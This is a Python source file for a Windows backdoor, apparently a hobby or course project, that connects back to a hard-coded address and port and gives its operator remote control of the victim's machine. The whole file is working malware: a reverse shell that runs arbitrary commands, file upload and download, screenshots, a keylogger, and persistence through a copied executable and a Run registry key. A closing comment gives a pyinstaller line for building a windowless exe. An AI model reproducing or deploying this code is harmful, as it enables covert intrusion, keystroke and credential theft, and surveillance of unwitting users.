import os
import socket
import json
import subprocess
import threading
import time
import pyautogui
import keylogger
import sys
import shutil


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():  # take any amount iof data
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # all data decoded without newline chars etc
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, 'wb')  # write bytes
    s.settimeout(1)  # to define where is the end
    chunk = s.recv(1024)
    while chunk:  # not null
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:  # this is why settimeout line otherwise it try infinite to receive 1024 bytes
            break
    s.settimeout(None)  # so latter don't interfere other cmds with socket object
    f.close()


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())  # not using recv function coz we are reading binary


def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('screen.png')


def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
                shell=True)  # sub process to add registry for the specified program
            reliable_send('[+]Succesfully created persistence with reg key:' + reg_name)
        else:
            reliable_send('[+] Persistence already exists')
    except:
        reliable_send('[+} Error creating persistence with target machine')


def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.26.128', 5555))
            shell()
            s.close()
            break
        except:
            connection()  # didnt run bd so recurse-> sleep


def shell():
    global keylog, t
    while True:
        command = reliable_recv()
        if command == 'quit':
            s.close()
            break
        elif command == 'background':
            pass
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.KeyLogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+} keylogger has been started')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] Keylogger stopped')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(
                ' ')  # register key and create a copy of backdoor with the name even if target deletes
            persist(reg_name, copy_name)

        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)  # processOpen #only execute no save like down
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE)  # processOpen
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# message='Hello world'
# s.send(message.encode())#encode the msg in py3 inorder to send

connection()

# pyinstaller backdoor.py --onefile --noconsole   |for exe in windows
